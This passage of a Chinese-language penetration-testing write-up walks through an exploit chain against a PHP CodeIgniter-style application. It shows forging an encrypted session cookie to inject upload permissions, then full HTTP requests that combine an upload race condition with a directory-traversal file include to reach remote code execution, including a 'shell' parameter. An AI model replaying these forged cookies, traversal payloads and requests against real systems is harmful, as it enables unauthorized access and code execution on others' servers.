                    }
                }
                $customData = $this->_unserialize($user['user_data']);
                array_merge($permisssions, $customData['permission']);
                $user['permissions'] = $permissions;
                return $user;
            }
        }
        else {
            return array();
        }
    }
跟踪 findUserById() 的逻辑发现，主要进行了数据库查询操作，但是对于 $permissions，还有一部分来自 session 相关的数据库。
### session 伪造
常规数据库可能没办法直接修改，但是 session 数据库也许会伴随用户状态的改变而修改，那么如果 session
数据库中的信息可控，也可以达到我们的目的。
在 Session.php 中可以找到对 cookie 的相应操作。
    if ( ! $this->readSess())
    {
        $this->createSess();
    }
    else
    {
        $this->updateSess();
    }
    $this->markFlashdata();
首先看一下 readSess() 函数
    function readSess()
    {
        $session = $this->CI->input->cookie($this->sess_cookie_name);
        ...... （省略部分校验逻辑）
        if ($this->sess_encrypt_cookie == TRUE)
        {
            $session = $this->CI->encrypt->decode($session);
        }
        $session = $this->_unserialize($session);
        ......(校验 User-Agent / IP / last_activity 相关)
        if ($this->sess_use_database === TRUE)
        {
            ......(通过数据库校验 User-Agent / IP / last_activity 相关)
            $query = $this->CI->db->get($this->sess_table_name);
            ......
            $row = $query->row();
            if (isset($row->user_data) AND $row->user_data != '')
            {
                $customData = $this->_unserialize($row->user_data);
                if (is_array($customData))
                {
                    foreach ($customData as $key => $val)
                    {
                        $session[$key] = $val;
                    }
                }
            }
        }
        $this->userdata = $session;
        unset($session);
        return TRUE;
    }
看起来都是常规的操作，
  1. 首先校验了 cookie 的合法性，在设置 cookie 时就用了尾部的签名了来做校验；(这部分逻辑在代码中省略)
  2. 紧接着判断 cookie 中的其他特征，UA、ip 地址、过期时间等等是否合法；
  3. 最后还有一些用户自定义的数据，这些自定义数据先从数据库中取得的，也被放到了 $session 变量中。
然而 $session 变量最开始却是从这里来的：`$session = $this->_unserialize($session);`
当然这里似乎还有潜在的反序列化漏洞，不过暂且先不关注。 $session 最后在 $this->userdata = $session;
所以，如果我们直接在 cookie 中构造相应的数据结构，当它被反序列化到 $session 变量后，仍然可以被保存到 userdata 中。
紧接着 readSess() 之后， markFlashdata() 中调用了 setUserdata() 更新 $userdata，更进一步调用
writeSess() 写入到数据库中，
    function setUserdata($newdata = array(), $newval = '')
    {
        if (count($newdata) > 0)
        {
            foreach ($newdata as $key => $val)
            {
                $this->userdata[$key] = $val;
            }
        }
        $this->writeSess();
    }
然后是 writeSess()，这里将 $userdata 做了分类处理，并写入了数据库
    function writeSess()
    {
        ......
        $customUserdata = $this->userdata;
        $cookieUserdata = array();
        foreach (array(.....) as $val)
        {
            unset($customUserdata[$val]);
            $cookieUserdata[$val] = $this->userdata[$val];
        }
        $customUserdata = $this->_serialize($customUserdata);
        $this->CI->db->where('session_id', $this->userdata['session_id']);
        $this->CI->db->update($this->sess_table_name, array(......, 'user_data' => $customUserdata));
        ......
    }
调用 writeSess() 函数将除部分特殊字段之外其他字段作为 “自定义数据” 以关键字 user_data 存入数据库中，这也是我们想要操作的数据。
接下来就要着手伪造 cookie 了，本地执行对应的加解密算法。
加密部分：
    function encode($string, $key = '')
    {
        $key = $this->get_key($key);
        $enc = $this->cryptEncode($string, $key);
        return base64_encode($enc);
    }
解密部分：
    function decode($string, $key = '')
    {
        $key = $this->getKey($key);
        if (preg_match('/[^a-zA-Z0-9\/\+=]/', $string))
        {
            return FALSE;
        }
        $dec = base64_decode($string);
        if (($dec = $this->cryptDecode($dec, $key)) === FALSE)
        {
            return FALSE;
        }
        return $dec;
    }
$key 可以在配置文件中拿到。
具体 cryptDecode() 和 cryptEncode() 的代码很长，此处省略。
### 正式攻击
首先用已经掌握的低权限账号密码登陆，登陆之后会得到一个已经 "logged_in" 的 cookie。
例如：
>
> ci_session=xfaaLHsFHaexzWJQii6sC/Us7ydR6Y3PWILpwx1L5Hqlqu9SLVvO1uIjUWFsi4DhQl+FRvb3WjNASlaKYuT33PLMUSVxwWzMneuXUUWfhvAyu7hqq2nrn1TV044A9H77vkZ98dpBbHGzG5vXW0XBioeDL14f6Zp+0iho59bgTdqmibgEz1wfi6JUcUeKQ+eA4Hso+B42mMSC1V1m3MewyWqVhiiKL8ZgHexjnkeHOcty+0l+iBX2biiSEtQz0GJDPU3OoKmwF2M8MnkfNDFh6DhgwfH26LBVWmiUrJm75yBh6VyYkwboLixBYlHuc0Z4mzWYg+VOxWcjRFF6dzJ37NU8rXQYJap2XlSU3Yqc+N97YgRrMo6yLOPP9IakkM+YcqyImXF1zb77KKh5pIgqPFZR9xekt9p8EvtUpQKZrg8=824f09cccb5cf704340df4b5c205c26c5e9e52c2
解密之后：
>
> a:4:{s:10:"session_id";s:32:"xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx";s:10:"ip_address";s:13:"xxxxxxxxxxxxx";s:10:"user_agent";s:114:"xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx";s:13:"last_activity";i:xxxxxxxxxx;}
给这个序列化字符串加一点东西上去：
>
> a:5:{s:10:"session_id";s:32:"xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx";s:10:"ip_address";s:13:"xxxxxxxxxxxxx";s:10:"user_agent";s:114:"xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx";s:13:"last_activity";i:xxxxxxxxxxxxx;s:10:"permission";a:1:{s:16:"uploadController";a:1:{s:12:"uploadMethod";s:1:"1";}}}
然后调用加密函数再生成新的 cookie:
>
> ci_session=wFGkjcdbNDRwLaIh3t+AkrQR30J/laBpEf9mD5pxjhppUqz9CwMFy6WqGylz/dM+9iRbYEqt2B/V+Mcs0hhGWDafjU3eqpfci9P6w1zsVZcfyg3ub2neKa/PsMnMWLCWLrX1tSIjdOI9QiWLj9v6zkABa+4g1Wn1ZkyT/eFQKHVxOLU4pFgK4oJbmzyiCNbJ2yJYkGQdDllfkURn5Xz89ut9Lw9b6nttfgCWzbaVWO+cejiuqJmrZY5GsAgdhLDOWSHGIdxJrghVc52bU0JHLUlQcsG/bNdpozY5mu7i53mlb0N6fz3WQ9Rg2TqlW8hgCjVTZ15fxusN67E0uPaRTt70SAkbL+aSSFL2VilJEQTr+UxZ28NNERMkPlALDjy03itGFjf3+F1Y7m+rSCcfFMBpWPDpSA5v3uoFYgc44HB+HyBxd5KMHHqCjiD5/bIVt3fO53/1k5kQfYMKsKCJAfH/XwGpGoRUNEEjpjlZKIMUFiQFYblw3bOvpSUQneXm+yeJ/2wDbQ+E+IjgdZcrFGtKZwzZafaBH+2pcDG2Tbo=5c154e08c40a5d6a7652d8700429971065e97e07
具体利用过程中用到的请求包：
第一步： 利用伪造的 cookie 进行上传
part1：
POST /uplaodController/uplaodMethod HTTP/1.1  
......  
Cookie:
ci_session=wFGkjcdbNDRwLaIh3t%2BAkrQR30J/laBpEf9mD5pxjhppUqz9CwMFy6WqGylz/dM%2B9iRbYEqt2B/V%2BMcs0hhGWDafjU3eqpfci9P6w1zsVZcfyg3ub2neKa/PsMnMWLCWLrX1tSIjdOI9QiWLj9v6zkABa%2B4g1Wn1ZkyT/eFQKHVxOLU4pFgK4oJbmzyiCNbJ2yJYkGQdDllfkURn5Xz89ut9Lw9b6nttfgCWzbaVWO%2BcejiuqJmrZY5GsAgdhLDOWSHGIdxJrghVc52bU0JHLUlQcsG/bNdpozY5mu7i53mlb0N6fz3WQ9Rg2TqlW8hgCjVTZ15fxusN67E0uPaRTt70SAkbL%2BaSSFL2VilJEQTr%2BUxZ28NNERMkPlALDjy03itGFjf3%2BF1Y7m%2BrSCcfFMBpWPDpSA5v3uoFYgc44HB%2BHyBxd5KMHHqCjiD5/bIVt3fO53/1k5kQfYMKsKCJAfH/XwGpGoRUNEEjpjlZKIMUFiQFYblw3bOvpSUQneXm%2ByeJ/2wDbQ%2BE%2BIjgdZcrFGtKZwzZafaBH%2B2pcDG2Tbo%3D5c154e08c40a5d6a7652d8700429971065e97e07  
Content-Type: multipart/form-data;
boundary=------------------------85a71e8a43af37ac  
Content-Length: xxx
\--------------------------85a71e8a43af37ac  
Content-Disposition: form-data; name="uploadedFile"; filename="TempClass.php"  
Content-Type: image/png
\--------------------------85a71e8a43af37ac--
第二部，因为需要条件竞争，可以考虑把这个上传包放到 intruder 里重放个几百次，然后在上传的过程中，去尝试包含 /tmp/TempClass.php
，来达到竞争的效果。
part2:
POST /Meathods/method1 HTTP/1.1  
......  
Cookie:
ci_session=wFGkjcdbNDRwLaIh3t%2BAkrQR30J/laBpEf9mD5pxjhppUqz9CwMFy6WqGylz/dM%2B9iRbYEqt2B/V%2BMcs0hhGWDafjU3eqpfci9P6w1zsVZcfyg3ub2neKa/PsMnMWLCWLrX1tSIjdOI9QiWLj9v6zkABa%2B4g1Wn1ZkyT/eFQKHVxOLU4pFgK4oJbmzyiCNbJ2yJYkGQdDllfkURn5Xz89ut9Lw9b6nttfgCWzbaVWO%2BcejiuqJmrZY5GsAgdhLDOWSHGIdxJrghVc52bU0JHLUlQcsG/bNdpozY5mu7i53mlb0N6fz3WQ9Rg2TqlW8hgCjVTZ15fxusN67E0uPaRTt70SAkbL%2BaSSFL2VilJEQTr%2BUxZ28NNERMkPlALDjy03itGFjf3%2BF1Y7m%2BrSCcfFMBpWPDpSA5v3uoFYgc44HB%2BHyBxd5KMHHqCjiD5/bIVt3fO53/1k5kQfYMKsKCJAfH/XwGpGoRUNEEjpjlZKIMUFiQFYblw3bOvpSUQneXm%2ByeJ/2wDbQ%2BE%2BIjgdZcrFGtKZwzZafaBH%2B2pcDG2Tbo%3D5c154e08c40a5d6a7652d8700429971065e97e07  
Content-Type: multipart/form-data;
boundary=------------------------85a71e8a43af37ac  
Content-Length: 314
\--------------------------85a71e8a43af37ac  
Content-Disposition: form-data; name="class"
../../../../../../../../../../../../../../../../../../../../tmp/TempClass  
\--------------------------85a71e8a43af37ac  
Content-Disposition: form-data; name="method"
getData1  
\--------------------------85a71e8a43af37ac--
第三步，一旦包含成功，那么在实例化 TempClass 的时候，会写入一个新的 TempClass2，这下可没有代码会去 unlink
它了，可以被稳定的利用。
part3:
POST /Meathods/method1 HTTP/1.1  
......  
Cookie:
ci_session=wFGkjcdbNDRwLaIh3t%2BAkrQR30J/laBpEf9mD5pxjhppUqz9CwMFy6WqGylz/dM%2B9iRbYEqt2B/V%2BMcs0hhGWDafjU3eqpfci9P6w1zsVZcfyg3ub2neKa/PsMnMWLCWLrX1tSIjdOI9QiWLj9v6zkABa%2B4g1Wn1ZkyT/eFQKHVxOLU4pFgK4oJbmzyiCNbJ2yJYkGQdDllfkURn5Xz89ut9Lw9b6nttfgCWzbaVWO%2BcejiuqJmrZY5GsAgdhLDOWSHGIdxJrghVc52bU0JHLUlQcsG/bNdpozY5mu7i53mlb0N6fz3WQ9Rg2TqlW8hgCjVTZ15fxusN67E0uPaRTt70SAkbL%2BaSSFL2VilJEQTr%2BUxZ28NNERMkPlALDjy03itGFjf3%2BF1Y7m%2BrSCcfFMBpWPDpSA5v3uoFYgc44HB%2BHyBxd5KMHHqCjiD5/bIVt3fO53/1k5kQfYMKsKCJAfH/XwGpGoRUNEEjpjlZKIMUFiQFYblw3bOvpSUQneXm%2ByeJ/2wDbQ%2BE%2BIjgdZcrFGtKZwzZafaBH%2B2pcDG2Tbo%3D5c154e08c40a5d6a7652d8700429971065e97e07  
Content-Type: multipart/form-data;
boundary=------------------------85a71e8a43af37ac  
Content-Length: 433
\--------------------------85a71e8a43af37ac  
Content-Disposition: form-data; name="class"
../../../../../../../../../../../../../../../../../../../../tmp/TempClass2  
\--------------------------85a71e8a43af37ac  
Content-Disposition: form-data; name="method"
getData1  
\--------------------------85a71e8a43af37ac  
Content-Disposition: form-data; name="shell"
var_dump("hello,world");  
\--------------------------85a71e8a43af37ac--
OK, 打完收工。
## review
稍微来总结一下整条利用链：
  1. 找到文件上传 -> 一个 “不稳定” 的文件上传
  2. 找文件包含 -> 目录穿越导致任意文件包含
  3. 条件竞争 -> 结合 1、2 条件竞争获得 RCE
  4. 找权限控制 -> 伪造 cookie 得到任意接口的访问权限